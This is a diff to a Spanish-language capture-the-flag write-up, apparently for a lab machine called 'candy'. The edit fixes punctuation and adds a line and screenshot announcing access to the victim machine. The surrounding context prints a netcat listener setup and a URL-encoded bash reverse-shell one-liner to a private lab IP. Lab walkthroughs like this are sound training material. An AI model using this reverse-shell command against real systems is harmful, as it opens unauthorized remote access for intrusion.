@@ -57,7 +57,7 @@ Le damos a guardar y probamos inyectar un "id" en la url, nos devuelve el usuari
 
 <img width="829" height="316" alt="candy11" src="https://github.com/user-attachments/assets/ac408379-28ff-40b7-a6a5-abea600f4d2a" />
 
-Desde nuestra terminal, nos ponemos en escucha con netcat por el puerto 443 y nos lanzamos el típico oneliner de reverse shell,de la siguiente manera:
+Desde nuestra terminal, nos ponemos en escucha con netcat por el puerto 443 y nos lanzamos el típico oneliner de reverse shell, de la siguiente manera:
 
 ```bash
 bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/443 0>%261'
@@ -66,6 +66,10 @@ bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/443 0>%261'
 <img width="829" height="316" alt="candy12" src="https://github.com/user-attachments/assets/4963b87e-3712-4355-8ee6-f151c4b684c6" />
 
 <img width="1019" height="316" alt="candy13" src="https://github.com/user-attachments/assets/a9a7760b-82ad-4f17-8ac5-6ab2b4bc31f7" />
+
+¡Y en este punto ya estamos dentro de la máquina víctima!
+
+<img width="1019" height="316" alt="candy14" src="https://github.com/user-attachments/assets/66d78beb-fc52-4070-84c1-e6f81a23238b" />
 
 
 ## 🔑 ESCALADA DE PRIVILEGIOS
